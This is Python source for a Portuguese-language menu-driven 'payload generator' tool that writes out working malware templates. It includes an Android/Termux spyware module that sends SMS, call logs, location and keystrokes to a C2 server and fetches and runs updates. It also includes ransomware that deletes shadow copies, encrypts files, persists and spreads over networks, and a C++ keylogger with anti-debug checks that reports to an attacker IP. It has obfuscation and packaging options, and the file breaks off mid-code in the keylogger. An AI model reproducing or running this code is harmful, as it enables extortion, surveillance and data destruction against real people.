import base64
import random
import sys
import os
import zlib
import platform
import ctypes
import hashlib
import json
import time
from typing import Dict, List, Optional
from pathlib import Path
from argparse import ArgumentParser
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.layout import Layout
from rich.text import Text
from rich.markdown import Markdown
import pygments
from pygments.lexers import PythonLexer, CppLexer
from pygments.formatters import TerminalFormatter

console = Console()

class GeradorPayloadsElite:
    def __init__(self):
        self.payloads = {
            # Shells avançados
            'reverse_tcp_ssl': {
                'function': self.gerar_reverse_tcp_ssl,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Reverse Shell com criptografia SSL'
            },
            'bind_tcp_stealth': {
                'function': self.gerar_bind_tcp_stealth,
                'category': 'Shells',
                'danger_level': 'medium',
                'description': 'Bind Shell com técnicas de ocultação'
            },
            
            # Payloads destrutivos
            'limpar_disco': {
                'function': self.gerar_limpador_disco,
                'category': 'Destrutivos',
                'danger_level': 'high',
                'description': 'Sobrescreve o disco com dados aleatórios'
            },
            'ransomware_avancado': {
                'function': self.gerar_ransomware_avancado,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Criptografa arquivos com algoritmo híbrido'
            },
            
            # Payloads para Termux
            'termux_espiao': {
                'function': self.gerar_termux_espiao,
                'category': 'Termux',
                'danger_level': 'high',
                'description': 'Módulo de espionagem para Android'
            },
            
            # Payloads em C++
            'cpp_keylogger': {
                'function': self.gerar_cpp_keylogger,
                'category': 'C++',
                'danger_level': 'high',
                'description': 'Keylogger em C++ com anti-debug'
            },
            
            # Técnicas avançadas
            'injetor_processo': {
                'function': self.gerar_injetor_processo,
                'category': 'Avançados',
                'danger_level': 'high',
                'description': 'Injeção de código em processos'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'polimorfico': 'Ofuscação polimórfica (código mutável)',
            'metamorfico': 'Ofuscação metamórfica (reescrita completa)',
            'criptografar_aes': 'Criptografia AES-256 + XOR',
            'fragmentado': 'Fragmentação de código',
            'anti_analise': 'Técnicas anti-análise'
        }
        
        self.banners = [
            self._gerar_banner_apocaliptico(),
            self._gerar_banner_matrix(),
            self._gerar_banner_sangue()
        ]
        
        self.idioma_atual = 'pt_BR'
        
        self.avisos = {
            'high': """
            [blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]
            Este payload pode causar danos permanentes ao sistema alvo
            Use apenas em ambientes controlados com autorização explícita!
            """,
            'critical': """
            [blink bold white on red]☠️ PERIGO CRÍTICO ☠️[/blink bold white on red]
            Este payload é altamente destrutivo e pode:
            - Corromper dados permanentemente
            - Danificar sistemas de arquivos
            - Causar instabilidade irreversível
            - Ter consequências legais graves
            
            [bold]Você foi avisado![/bold]
            """
        }
        
        self._verificar_dependencias()
    
    def _gerar_banner_apocaliptico(self) -> str:
        return """
[bold red]
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌
▐░▌          ▐░▌     ▐░▌            ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌          ▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
[/bold red]
[bold white on red]        GERADOR DE PAYLOADS ELITE v6.66 - DARK EDITION[/bold white on red]
"""
    
    def _gerar_banner_matrix(self) -> str:
        return """
[bold green]
          0101010 01010101 01010101 01010101 01010101 0101010
        0101010101010101010101010101010101010101010101010101010
      01010101010101010101010101010101010101010101010101010101010
    010101010101010101010101010101010101010101010101010101010101010
  0101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
01010101010101010101010101010101010101010101010101010101010101010101010
 0101010101010101010101010101010101010101010101010101010101010101010
   010101010101010101010101010101010101010101010101010101010101010
     01010101010101010101010101010101010101010101010101010101010
       0101010101010101010101010101010101010101010101010101010
         01010101010101010101010101010101010101010101010101010
           0101010101010101010101010101010101010101010101010
             010101010101010101010101010101010101010101010
               01010101010101010101010101010101010101010
                 0101010101010101010101010101010101010
                   010101010101010101010101010101010
                     01010101010101010101010101010
                       0101010101010101010101010
                         010101010101010101010
                           01010101010101010
                             0101010101010
                               010101010
                                 01010
                                   0
[/bold green]
[bold black on green]        SISTEMA DE GERACAO DE PAYLOADS - MATRIX MODE[/bold black on green]
"""
    
    def _gerar_banner_sangue(self) -> str:
        return """
[bold red]
          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
[/bold red]
[bold white on red]        GERADOR DE PAYLOADS - EDICAO SANGUE[/bold white on red]
"""
    
    def _verificar_dependencias(self):
        """Verifica e instala dependências automaticamente"""
        required = {
            'cryptography': 'cryptography',
            'pycryptodome': 'pycryptodomex',
            'rich': 'rich',
            'pygments': 'pygments'
        }
        
        missing = []
        for pkg, install_name in required.items():
            try:
                __import__(pkg)
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print(Panel.fit(
                f"[red]✗ Dependências faltando: {', '.join(missing)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            if self._confirmar("Deseja instalar automaticamente?"):
                with self._criar_progresso() as progress:
                    task = progress.add_task("[red]Instalando dependências...[/red]", total=len(missing))
                    for pkg in missing:
                        os.system(f"pip install {pkg} --quiet")
                        progress.update(task, advance=1)
                console.print("[green]✓ Dependências instaladas com sucesso![/green]")
                time.sleep(1)
    
    def _confirmar(self, mensagem: str, nivel_perigo: str = None) -> bool:
        """Exibe um prompt de confirmação estilizado conforme o nível de perigo"""
        if nivel_perigo == 'high':
            return Confirm.ask(
                f"[blink red]☠️ {mensagem}[/blink red]",
                default=False
            )
        elif nivel_perigo == 'critical':
            return Confirm.ask(
                f"[blink white on red]⛧ {mensagem} ⛧[/blink white on red]",
                default=False
            )
        else:
            return Confirm.ask(f"[yellow]? {mensagem}[/yellow]")
    
    def _criar_progresso(self) -> Progress:
        """Cria uma barra de progresso estilizada"""
        return Progress(
            TextColumn("[progress.description]{task.description}"),
            BarColumn(bar_width=None, complete_style="red", finished_style="red"),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TextColumn("[red]☠️[/red]"),
            transient=True
        )
    
    def mostrar_banner(self):
        """Exibe um banner aleatório com efeitos"""
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ USE APENAS PARA TESTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)  # Pausa dramática
    
    def mostrar_menu_principal(self):
        """Exibe o menu principal interativo"""
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 MENU PRINCIPAL - GERADOR DE PAYLOADS[/bold cyan]",
                show_header=True,
                header_style="bold magenta",
                border_style="blue"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Categoria", style="green")
            tabela.add_column("Nível de Perigo", style="red")
            
            categorias = {
                'Shells': "Shells Avançados",
                'Destrutivos': "Payloads Destrutivos",
                'Termux': "Módulos Termux",
                'C++': "Payloads C++",
                'Avançados': "Técnicas Avançadas"
            }
            
            for i, (cod, nome) in enumerate(categorias.items(), 1):
                perigo = "☠️ CRÍTICO" if cod == 'Destrutivos' else "⚠️ ALTO" if cod in ['Termux', 'Avançados'] else "◎ MÉDIO"
                tabela.add_row(str(i), nome, perigo)
            
            tabela.add_row("0", "Configurações", "⚙️")
            tabela.add_row("9", "Sair", "🚪")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione uma opção",
                choices=[str(i) for i in range(0, 10)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._mostrar_submenu('Shells')
            elif escolha == "2":
                self._mostrar_submenu('Destrutivos')
            elif escolha == "3":
                self._mostrar_submenu('Termux')
            elif escolha == "4":
                self._mostrar_submenu('C++')
            elif escolha == "5":
                self._mostrar_submenu('Avançados')
            elif escolha == "0":
                self._mostrar_menu_configuracao()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_submenu(self, categoria: str):
        """Mostra um submenu para uma categoria específica"""
        payloads_categoria = {k: v for k, v in self.payloads.items() if v['category'] == categoria}
        
        while True:
            console.clear()
            titulo = f"[bold]{categoria.upper()}[/bold] - Selecione um payload"
            
            if categoria == 'Destrutivos':
                titulo = f"[blink bold red]☠️ {categoria.upper()} ☠️[/blink bold red]"
            
            tabela = Table(
                title=titulo,
                show_header=True,
                header_style="bold blue",
                border_style="red" if categoria == 'Destrutivos' else "blue"
            )
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Nome", style="green")
            tabela.add_column("Descrição")
            tabela.add_column("Perigo", style="red")
            
            for i, (nome, dados) in enumerate(payloads_categoria.items(), 1):
                icone_perigo = {
                    'medium': '⚠️',
                    'high': '🔥',
                    'critical': '💀'
                }.get(dados['danger_level'], '')
                tabela.add_row(
                    str(i),
                    nome,
                    dados['description'],
                    f"{icone_perigo} {dados['danger_level'].upper()}"
                )
            
            tabela.add_row("0", "Voltar", "Retorna ao menu principal", "↩️")
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione um payload",
                choices=[str(i) for i in range(0, len(payloads_categoria)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
            
            nome_payload = list(payloads_categoria.keys())[int(escolha)-1]
            self._processar_payload(nome_payload)
    
    def _processar_payload(self, nome_payload: str):
        """Processa a geração de um payload específico"""
        payload_data = self.payloads[nome_payload]
        
        # Verificação para payloads perigosos
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                self.avisos[payload_data['danger_level']],
                title="[blink bold red]ALERTA DE SEGURANÇA[/blink bold red]",
                border_style="red"
            ))
            
            if not self._confirmar("Confirmar criação deste payload?", payload_data['danger_level']):
                return
        
        # Configuração do payload
        config = self._configurar_payload(nome_payload)
        if config is None:  # Usuário cancelou
            return
        
        # Seleção de técnicas de ofuscação
        ofuscar = False
        tecnicas = []
        if self._confirmar("Aplicar técnicas de ofuscação?"):
            ofuscar = True
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        # Geração do payload
        with self._criar_progresso() as progress:
            task = progress.add_task("[red]Gerando payload...[/red]", total=100)
            
            # Etapa 1: Gerar código base
            payload = payload_data['function'](**config)
            progress.update(task, advance=30)
            
            # Etapa 2: Aplicar ofuscação
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_avancado(payload, tecnica)
                    progress.update(task, advance=20)
            
            progress.update(task, completed=100)
        
        # Visualização do payload
        self._preview_payload(payload, 'python' if nome_payload not in ['cpp_keylogger'] else 'cpp')
        
        # Salvamento do arquivo
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        """Configura os parâmetros específicos do payload"""
        config = {}
        
        if nome_payload in ['reverse_tcp_ssl', 'bind_tcp_stealth']:
            console.print(Panel.fit(
                "[bold]Configuração de Conexão[/bold]",
                border_style="blue"
            ))
            config['ip'] = Prompt.ask("[yellow]?[/yellow] IP do atacante", default="192.168.1.100")
            config['porta'] = IntPrompt.ask("[yellow]?[/yellow] Porta", default=4444)
        
        elif nome_payload == 'ransomware_avancado':
            console.print(Panel.fit(
                "[bold red]Configuração de Ransomware[/bold red]",
                border_style="red"
            ))
            config['extensoes'] = Prompt.ask(
                "[yellow]?[/yellow] Extensões para criptografar (separadas por vírgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados! Pagamento em Bitcoin para descriptografar."
            )
            config['destruir_backups'] = self._confirmar("Destruir cópias de sombra/shadow copies?")
        
        elif nome_payload == 'termux_espiao':
            console.print(Panel.fit(
                "[bold green]Configuração de Módulo Espião[/bold green]",
                border_style="green"
            ))
            config['servidor_c2'] = Prompt.ask(
                "[yellow]?[/yellow] Servidor C2 (ex: https://dominio.com/api)",
                default="https://servidor-c2.com/coletar"
            )
            config['intervalo'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo de coleta (minutos)",
                default=15
            )
        
        # Confirmação final
        console.print("\n[bold]Resumo da configuração:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not self._confirmar("Confirmar configurações?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        """Permite selecionar técnicas de ofuscação"""
        console.print("\n[bold]Técnicas de Ofuscação Disponíveis:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("Código", style="green")
        tabela.add_column("Descrição")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), codigo, desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione técnicas (separadas por vírgula)",
            default="1,3"  # Polimórfico + AES por padrão
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str, language: str = 'python'):
        """Mostra uma prévia do payload com syntax highlighting"""
        console.print(Panel.fit(
            "[bold]PRÉ-VISUALIZAÇÃO DO PAYLOAD[/bold]",
            border_style="yellow"
        ))
        
        # Usando Pygments para syntax highlighting
        lexer = PythonLexer() if language == 'python' else CppLexer()
        formatter = TerminalFormatter()
        
        # Limita a pré-visualização às primeiras 100 linhas
        lines = payload.split('\n')[:100]
        code = '\n'.join(lines)
        
        highlighted = pygments.highlight(code, lexer, formatter)
        console.print(highlighted)
        
        if len(payload.split('\n')) > 100:
            console.print("[yellow]... (arquivo truncado para visualização)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        """Salva o payload em um arquivo com opções avançadas"""
        default_ext = {
            'cpp_keylogger': '.cpp',
            'cpp_memory_injection': '.cpp'
        }.get(nome_payload, '.py')
        
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo de saída",
            default=f"payload_{nome_payload}{default_ext}"
        )
        
        # Opções avançadas de salvamento
        if self._confirmar("Ativar opções avançadas de salvamento?"):
            self._salvamento_avancado(nome_payload, nome_arquivo, payload)
            return
        
        # Salvamento simples
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            # Calcula hash do arquivo
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]✓ Payload salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5:    [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro ao salvar arquivo: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _salvamento_avancado(self, nome_payload: str, nome_arquivo: str, payload: str):
        """Oferece opções avançadas de salvamento"""
        console.print("\n[bold]Opções Avançadas de Salvamento:[/bold]")
        tabela = Table(show_header=False)
        tabela.add_row("1", "Empacotar como executável (PyInstaller)")
        tabela.add_row("2", "Ocultar em arquivo legítimo (Steganografia)")
        tabela.add_row("3", "Adicionar persistência automática")
        tabela.add_row("4", "Salvar normalmente")
        console.print(tabela)
        
        escolha = Prompt.ask(
            "[yellow]?[/yellow] Selecione uma opção",
            choices=["1", "2", "3", "4"],
            show_choices=False
        )
        
        if escolha == "1":
            self._empacotar_com_pyinstaller(nome_arquivo, payload)
        elif escolha == "2":
            self._ocultar_em_arquivo(nome_arquivo, payload)
        elif escolha == "3":
            self._adicionar_persistencia(nome_payload, nome_arquivo, payload)
        else:
            self._salvar_payload(nome_payload, payload)
    
    def _empacotar_com_pyinstaller(self, nome_arquivo: str, payload: str):
        """Empacota o payload como executável usando PyInstaller"""
        try:
            # Salvar script temporário
            temp_script = f"temp_{nome_arquivo}"
            with open(temp_script, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            console.print("[cyan]▶ Empacotando com PyInstaller...[/cyan]")
            
            # Comandos diferentes para Windows e Linux
            if platform.system() == 'Windows':
                os.system(f'pyinstaller --onefile --noconsole --icon=NONE {temp_script}')
                console.print(Panel.fit(
                    f"[green]✓ Executável gerado em dist/{temp_script[:-3]}.exe[/green]",
                    border_style="green"
                ))
            else:
                os.system(f'pyinstaller --onefile {temp_script}')
                console.print(Panel.fit(
                    f"[green]✓ Executável gerado em dist/{temp_script[:-3]}[/green]",
                    border_style="green"
                ))
            
            # Limpeza
            os.remove(temp_script)
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro ao empacotar: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    # ==============================================
    # PAYLOADS AVANÇADOS - IMPLEMENTAÇÕES COMPLETAS
    # ==============================================
    
    def gerar_termux_espiao(self, servidor_c2: str, intervalo: int = 15, **kwargs) -> str:
        """Módulo de espionagem completo para Termux no Android"""
        payload = f"""import os
import sys
import time
import requests
from threading import Thread
from subprocess import Popen, PIPE

class TermuxEspiao:
    def __init__(self):
        self.servidor_c2 = "{servidor_c2}"
        self.intervalo = {intervalo} * 60  # Convertendo para segundos
        self.cripto_chave = os.urandom(32)
        self.cripto_iv = os.urandom(16)
        
    def _criptografar(self, dados):
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        cipher = AES.new(self.cripto_chave, AES.MODE_CBC, self.cripto_iv)
        return cipher.encrypt(pad(dados.encode(), AES.block_size))
    
    def _enviar_dados(self, dados):
        try:
            dados_cripto = self._criptografar(json.dumps(dados))
            files = {{'file': ('data.enc', dados_cripto)}}
            requests.post(self.servidor_c2, files=files, timeout=30)
        except:
            pass
    
    def coletar_sms(self):
        try:
            cmd = "termux-sms-list -l 50"  # Últimas 50 mensagens
            output = Popen(cmd, shell=True, stdout=PIPE).communicate()[0].decode()
            return {{"sms": output}}
        except:
            return {{"sms": "erro"}}
    
    def coletar_chamadas(self):
        try:
            cmd = "termux-call-log -l 50"  # Últimas 50 chamadas
            output = Popen(cmd, shell=True, stdout=PIPE).communicate()[0].decode()
            return {{"chamadas": output}}
        except:
            return {{"chamadas": "erro"}}
    
    def coletar_localizacao(self):
        try:
            cmd = "termux-location"
            output = Popen(cmd, shell=True, stdout=PIPE).communicate()[0].decode()
            return {{"localizacao": output}}
        except:
            return {{"localizacao": "erro"}}
    
    def coletar_midia(self):
        try:
            # Lista arquivos de mídia recentes
            cmd = "find ~/storage -type f \( -iname '*.jpg' -o -iname '*.png' -o -iname '*.mp4' \) -mtime -7"
            output = Popen(cmd, shell=True, stdout=PIPE).communicate()[0].decode()
            return {{"midia": output.split('\\n')[:10]}}  # Limita a 10 arquivos
        except:
            return {{"midia": "erro"}}
    
    def monitorar_teclado(self):
        try:
            # Usando o serviço de acessibilidade do Termux
            cmd = "termux-keystore monitor"
            output = Popen(cmd, shell=True, stdout=PIPE).communicate()[0].decode()
            return {{"teclado": output}}
        except:
            return {{"teclado": "erro"}}
    
    def coletar_tudo(self):
        dados = {{
            "dispositivo": platform.uname()._asdict(),
            "hora": time.strftime("%Y-%m-%d %H:%M:%S"),
            **self.coletar_sms(),
            **self.coletar_chamadas(),
            **self.coletar_localizacao(),
            **self.coletar_midia(),
            **self.monitorar_teclado()
        }}
        self._enviar_dados(dados)
    
    def adicionar_persistencia(self):
        try:
            # Adiciona à inicialização do Termux
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"python {{__file__}} &\\n")
            
            # Cria serviço no Android (requer root)
            if os.path.exists("/data/data/com.termux/files/usr/bin/sv-enable"):
                service_dir = "/data/data/com.termux/files/usr/share/termux-espiao"
                os.makedirs(service_dir, exist_ok=True)
                
                with open(f"{{service_dir}}/run", "w") as f:
                    f.write("#!/bin/sh\\n")
                    f.write(f"exec python {{__file__}}\\n")
                os.chmod(f"{{service_dir}}/run", 0o755)
                
                os.system("ln -s {service_dir} /data/data/com.termux/files/usr/var/service/termux-espiao")
                os.system("sv-enable termux-espiao")
        except:
            pass
    
    def verificar_atualizacoes(self):
        try:
            response = requests.get(f"{{self.servidor_c2}}/versao", timeout=10)
            if response.status_code == 200:
                nova_versao = response.json().get("versao")
                if nova_versao != "1.0":
                    # Baixar e executar atualização
                    update = requests.get(f"{{self.servidor_c2}}/update", timeout=30).content
                    with open(__file__, "wb") as f:
                        f.write(update)
                    os.execv(__file__, sys.argv)
        except:
            pass
    
    def executar(self):
        self.adicionar_persistencia()
        
        while True:
            try:
                self.coletar_tudo()
                self.verificar_atualizacoes()
                time.sleep(self.intervalo)
            except:
                time.sleep(60)

if __name__ == '__main__':
    espiao = TermuxEspiao()
    espiao.executar()"""
        return payload
    
    def gerar_ransomware_avancado(self, extensoes: List[str], resgate: str, destruir_backups: bool = True, **kwargs) -> str:
        """Ransomware avançado com criptografia híbrida"""
        payload = f"""import os
import sys
import time
import json
import base64
from threading import Thread
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

class RansomwareAvancado:
    def __init__(self):
        self.extensoes = {extensoes}
        self.mensagem_resgate = '''{resgate}'''
        self.destruir_backups = {destruir_backups}
        
        # Gerar par de chaves RSA
        self.chave_rsa = RSA.generate(2048)
        self.chave_publica = self.chave_rsa.publickey().export_key()
        
        # Gerar ID único para a vítima
        self.id_vitima = hashlib.sha256(os.urandom(32)).hexdigest()[:16]
        
    def _gerar_chave_aes(self):
        return get_random_bytes(32)
    
    def _criptografar_chave_aes(self, chave_aes):
        cipher_rsa = PKCS1_OAEP.new(self.chave_rsa)
        return cipher_rsa.encrypt(chave_aes)
    
    def _destruir_backups(self):
        if not self.destruir_backups:
            return
            
        try:
            # Windows - Shadow Copies
            if platform.system() == 'Windows':
                os.system('vssadmin delete shadows /all /quiet')
            
            # Linux - Snapshots
            else:
                os.system('btrfs subvolume list / | cut -d" " -f9 | xargs -I{{}} btrfs subvolume delete /{{}}')
        except:
            pass
    
    def criptografar_arquivo(self, caminho_arquivo):
        try:
            # Gerar nova chave AES para cada arquivo
            chave_aes = self._gerar_chave_aes()
            iv = get_random_bytes(16)
            
            # Criptografar arquivo com AES
            cipher_aes = AES.new(chave_aes, AES.MODE_CBC, iv)
            
            with open(caminho_arquivo, 'rb') as f:
                dados = f.read()
            
            dados_cripto = cipher_aes.encrypt(pad(dados, AES.block_size))
            
            # Criptografar chave AES com RSA
            chave_aes_cripto = self._criptografar_chave_aes(chave_aes)
            
            # Salvar arquivo criptografado
            with open(caminho_arquivo + '.encrypted', 'wb') as f:
                f.write(iv)
                f.write(chave_aes_cripto)
                f.write(dados_cripto)
            
            # Remover arquivo original
            os.remove(caminho_arquivo)
            
            # Adicionar metadados
            with open(caminho_arquivo + '.meta', 'w') as f:
                json.dump({{
                    'id_vitima': self.id_vitima,
                    'hora': time.time(),
                    'original': os.path.basename(caminho_arquivo)
                }}, f)
                
        except Exception as e:
            pass
    
    def criar_arquivo_resgate(self):
        resgate = {{
            'mensagem': self.mensagem_resgate,
            'id_vitima': self.id_vitima,
            'chave_privada': base64.b64encode(self.chave_rsa.export_key()).decode(),
            'instrucoes': 'Envie 0.5 BTC para [endereço] e envie o ID para liberação'
        }}
        
        for diretorio in ['Desktop', 'Documents', 'Downloads']:
            try:
                caminho = os.path.join(os.path.expanduser('~'), diretorio, 'LEIA-ME.txt')
                with open(caminho, 'w') as f:
                    json.dump(resgate, f, indent=4)
            except:
                pass
    
    def adicionar_persistencia(self):
        try:
            if platform.system() == 'Windows':
                import winreg
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    'Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                    0, winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, sys.argv[0])
                winreg.CloseKey(key)
            else:
                with open('/etc/rc.local', 'a') as f:
                    f.write(f'python3 {{sys.argv[0]}} &\\n')
        except:
            pass
    
    def propagar(self):
        # Tenta se propagar para dispositivos na rede
        try:
            if platform.system() == 'Windows':
                os.system('copy "{}" "C:\\Users\\Public\\Documents\\update.exe"'.format(sys.argv[0]))
                os.system('net use * /delete /y && for /f %a in (\'net view ^| find "\\\\"\') do copy "C:\\Users\\Public\\Documents\\update.exe" "%a\\C$\\Windows\\Temp\\update.exe"')
            else:
                os.system('cp "{}" "/tmp/update" && chmod +x "/tmp/update"'.format(sys.argv[0]))
                os.system('for ip in $(arp -n | grep -v "incomplete" | awk \'{{print $1}}\'); do scp /tmp/update $ip:/tmp/; done')
        except:
            pass
    
    def executar(self):
        # Fase 1: Destruir backups
        self._destruir_backups()
        
        # Fase 2: Criptografar arquivos em paralelo
        threads = []
        for raiz, _, arquivos in os.walk(os.path.expanduser('~')):
            for arquivo in arquivos:
                if any(arquivo.lower().endswith(ext.lower()) for ext in self.extensoes):
                    t = Thread(target=self.criptografar_arquivo, args=(os.path.join(raiz, arquivo),))
                    threads.append(t)
                    t.start()
        
        for t in threads:
            t.join()
        
        # Fase 3: Persistência e propagação
        self.adicionar_persistencia()
        self.propagar()
        
        # Fase 4: Exibir resgate
        self.criar_arquivo_resgate()

if __name__ == '__main__':
    ransomware = RansomwareAvancado()
    ransomware.executar()"""
        return payload
    
    def gerar_cpp_keylogger(self, **kwargs) -> str:
        """Keylogger em C++ com técnicas anti-debugging"""
        return """// Keylogger Avançado em C++ com Anti-Debug
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <ctime>
#include <thread>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "advapi32.lib")

#define LOG_FILE "systemlog.dat"
#define SERVER_IP "192.168.1.100"
#define SERVER_PORT 4444

// Variáveis globais
SOCKET sock = INVALID_SOCKET;
bool running = true;
HANDLE hMutex = NULL;

// Técnicas Anti-Debugging
bool is_being_debugged() {
    return IsDebuggerPresent();
}

bool check_virtual_machine() {
    unsigned int hypervisor_bit = 0;
    __asm {
        mov eax, 1
        cpuid
        bt ecx, 31
        setc hypervisor_bit
    }
    return hypervisor_bit;
}

void anti_debug_checks() {
    if (is_being_debugged() || check_virtual_machine()) {
        ExitProcess(1);
    }
    
    // Verifica presença de ferramentas de análise
    const char* blacklist[] = {
        "ollydbg.exe", "ProcessHacker.exe", "tcpview.exe", 
        "wireshark.exe", "fiddler.exe", "vmware.exe", "vboxservice.exe"
    };
    
